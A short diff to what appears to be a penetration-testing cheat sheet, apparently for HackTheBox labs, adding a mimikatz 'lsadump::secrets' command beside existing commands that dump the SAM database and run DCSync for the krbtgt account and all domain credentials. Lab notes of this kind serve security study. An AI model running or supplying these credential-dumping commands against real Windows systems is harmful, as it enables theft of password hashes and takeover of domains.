@@ -760,6 +760,7 @@ whoami /user
 
 # lsadump
 .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
 .\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt /domain:htb.local" "exit"
 .\mimikatz.exe "privilege::debug" "lsadump::dcsync /all /domain:htb.local" "exit"
 ```
